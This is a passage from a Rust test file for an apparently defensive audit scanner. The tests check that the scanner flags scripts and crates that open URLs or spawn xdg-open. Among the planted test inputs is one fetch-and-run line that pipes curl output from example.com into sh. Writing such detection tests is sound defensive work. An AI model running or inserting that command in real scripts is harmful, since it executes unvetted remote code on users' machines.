        "curl -sSL https://example.com/install.sh | sh\n",
    ] {
        let planted = vec![("ATLAS.sh".to_string(), attack.to_string())];
        assert!(
            !script_findings(&planted).is_empty(),
            "the script rule missed a planted opener: {attack}"
        );
    }

    // And a message that *tells the reader* where to go is allowed: that is the app
    // handing the decision to the human, which is the whole point.
    let message = vec![(
        "ATLAS.sh".to_string(),
        "say \"Open https://rustup.rs in your browser, follow the single step there,\"\n"
            .to_string(),
    )];
    assert!(
        script_findings(&message).is_empty(),
        "a message about rustup.rs was read as an opener"
    );
}

/// The whole path, end to end: a tree on disk, the scanner's own file walk, and the four
/// rules. The planted cases in each test above feed the rules a `SourceFile` they built
/// themselves; this one makes the *scanner* find the file, so a change to `shipped_code`
/// (a path, a filter, an extension) cannot turn every rule above into a no-op.
#[test]
fn the_scan_reads_a_tree_and_reports_a_planted_handoff() {
    let dir = std::env::temp_dir().join(format!(
        "atlas-audit-open-url-{}",
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&dir);
    let src = dir.join("atlas-attack").join("src");
    std::fs::create_dir_all(&src).expect("the planted crate's src");
    std::fs::write(
        src.join("lib.rs"),
        "pub mod handoff;\npub fn ready() -> bool { true }\n",
    )
    .expect("lib.rs");
    std::fs::write(
        src.join("handoff.rs"),
        r#"pub fn hand_off(url: &str) {
    let _ = std::process::Command::new("xdg-open").arg(url).spawn();
}
"#,
    )
    .expect("handoff.rs");

    let files = shipped_code(&dir);
    eprintln!(
        "planted tree: {} shipped file(s) — {:?}",
        files.len(),
        files.iter().map(|file| file.path.clone()).collect::<Vec<_>>()
    );
    assert!(
        files.iter().any(|file| file.path == "atlas-attack/src/handoff.rs"),
        "the scanner did not read the planted crate — every rule above would pass on nothing"
    );
    assert!(
        !opener_findings(&files).is_empty(),
        "the opener rule found nothing in a file that spawns xdg-open"
    );
    assert!(
        !off_list_spawns(&files).is_empty(),
        "the spawn table accepted a crate it has no entry for"
    );
    assert!(
        !address_programs(&files).is_empty(),
        "the program rule accepted xdg-open"
    );
    assert!(
        !url_arguments(&files).is_empty(),
        "the argv rule accepted an address passed to a child"
    );
    let _ = std::fs::remove_dir_all(&dir);
}
